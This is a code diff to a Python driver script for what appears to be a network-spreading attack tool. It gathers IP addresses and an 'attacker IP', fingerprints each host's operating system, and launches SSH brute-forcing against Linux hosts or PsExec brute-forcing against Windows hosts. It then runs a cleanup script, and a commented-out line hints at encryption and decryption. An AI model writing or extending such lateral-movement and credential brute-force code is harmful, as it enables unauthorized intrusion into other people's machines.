@@ -9,16 +9,22 @@ import get_ip
 import get_os
 import SSHBruteForce as ssh
 import port_scan as port
-
-ip_list = get_ip.get_ip_()
+import Psexec_BruteForce as ps
+import sys
+print(sys.argv[1])
+server_pid= sys.argv[1]
+ip_list,attacker_ip = get_ip.get_ip_()
 print(ip_list)
+print(attacker_ip)
 for ip in ip_list:
    os_name = get_os.get_os_(ip)
    port_22 = port.check_open_port(ip)
-   print(port_22)
-   print(os_name)
    if(os_name == 'Linux' and port_22 == True ):
           ssh.d_main(ip)
+   elif(os_name == 'Microsoft'):
+          ps.d_main(ip,attacker_ip)
+os.system('bash close.sh {0}'.format(server_pid))
+          
 
 
 #driver = int(input("Enter 1 for encryption and 2 for decryption:"))
